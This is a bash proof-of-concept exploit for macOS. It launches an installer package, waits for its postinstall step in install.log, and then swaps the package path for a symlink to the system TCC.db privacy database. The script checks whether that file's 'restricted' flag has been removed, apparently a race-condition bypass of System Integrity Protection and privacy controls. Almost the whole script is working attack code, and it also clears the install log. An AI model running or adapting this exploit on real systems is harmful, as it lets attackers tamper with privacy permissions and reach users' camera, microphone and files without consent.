#!/bin/bash

# provide the package path
if [ $# -eq 0 ]; then
    echo "No arguments provided. Usage: $0 <PKG_PATH>"
    exit 1
fi

echo "[*] preparing the environment..."
TARGET_FILE="/Library/Application Support/com.apple.TCC/TCC.db"
PKG_PATH=$1
MOUNT_DIR="/"
SHARED_SUPPORT_PATH="/Applications/Install macOS Ventura.app/Contents/SharedSupport/SharedSupport.dmg"
PKG_NAME="${PKG_PATH##*/}"
PKG_TEMP_DIR="/tmp/$PKG_NAME"

if [ -e "$SHARED_SUPPORT_PATH" ]; then
    echo "[*] cleaning previous installation..."
    sudo rm -rf /Applications/Install macOS Ventura.app
fi

#sudo cp $PKG_PATH $PKG_TEMP_DIR # make a backup of the PKG because its going to be overwritten.
sudo cat /dev/null > /var/log/install.log

sudo echo "[*] all the preparations are done."
sudo installer -pkg $PKG_PATH -target $MOUNT_DIR &

echo "[*] waiting for installer..."
while true; do
    if tail -n 60 /var/log/install.log | grep -q 'Executing script "./postinstall.sh"'; then
        sudo ln -sf "$TARGET_FILE" "$PKG_PATH"
        if [ $? -eq 0 ]; then
            echo "[+] symlink [$PKG_PATH] -> [$TARGET_FILE] created successfully!"
        else
            echo "[-] failed to create symlink [$PKG_PATH] -> [$TARGET_FILE]"
        fi
        
        break
    fi
done

sleep 3

# extract the restricted flag
restricted_flag=$(ls -ldO "$TARGET_FILE" | awk '{print $5}')

# Check if the flag has been removed
if [ "$restricted_flag" == "-" ]; then
    echo "[+] exploit completed successfully!"
else
    echo "[-] exploit has failed"
fi

echo "[*] all done."